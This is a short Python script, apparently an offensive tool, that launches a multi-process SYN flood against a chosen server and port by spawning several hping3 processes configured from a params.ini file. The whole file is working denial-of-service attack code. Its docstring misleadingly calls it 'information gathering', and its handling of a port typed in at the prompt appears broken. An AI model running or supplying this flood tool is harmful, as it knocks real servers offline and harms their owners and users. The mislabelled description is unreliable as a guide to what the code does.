#!/usr/bin/env python3
"""
This modules runs various information gathering functions for a target system

File name: pydos_hping3.py
Author: Konstantinos Christos Liosis
Date created: 31/7/2018
Python Version: 3.6.0

Example execution:
$python sudo pydos_hping3.py
"""

from subprocess import run
import sys
import argparse
import multiprocessing
import configparser

# parameters loading
params = configparser.ConfigParser()
params.read('params.ini')


def flood_worker(addr, port, interval, payload):
    """
    Each flood worker will be an hping3 flood process
    :param addr: Target server address
    :param port: Target port address
    :return: None
    """

    run(['hping3',
        '--syn',
        '-i', 'u' + interval,
        '-d', payload,
        '-S',
        '-p', port,
        addr])


def main(addr=None, port=None):
    parser = argparse.ArgumentParser()

    # server
    parser.add_argument('-server', help='Server')
    # port
    parser.add_argument('-port', help='Port')

    args = parser.parse_args()

    if not (args.server and args.port):
        print('Define server address and port')
        addr = input('Server: ')
        port = int(input('Port: '))

    elif not args.port:
        print('Define port')
        port = int(input('Port: '))
        addr = args.server

    elif not args.server:
        print('Define server')
        addr = input('Server: ')
        port = args.port

    else:
        addr = args.server
        port = args.port

    # num of flooding processes
    bots = int(params['DoS']['bots'])
    # packet size
    payload = params['DoS']['payload']
    # interval between packets
    interval = params['DoS']['interval']

    floods = []
    for _ in range(bots):
        process = multiprocessing.Process(target=flood_worker, args=(addr,
                                                                     port,
                                                                     interval,
                                                                     payload,))
        floods.append(process)
        process.start()

if __name__ == "__main__":
    main(sys.argv)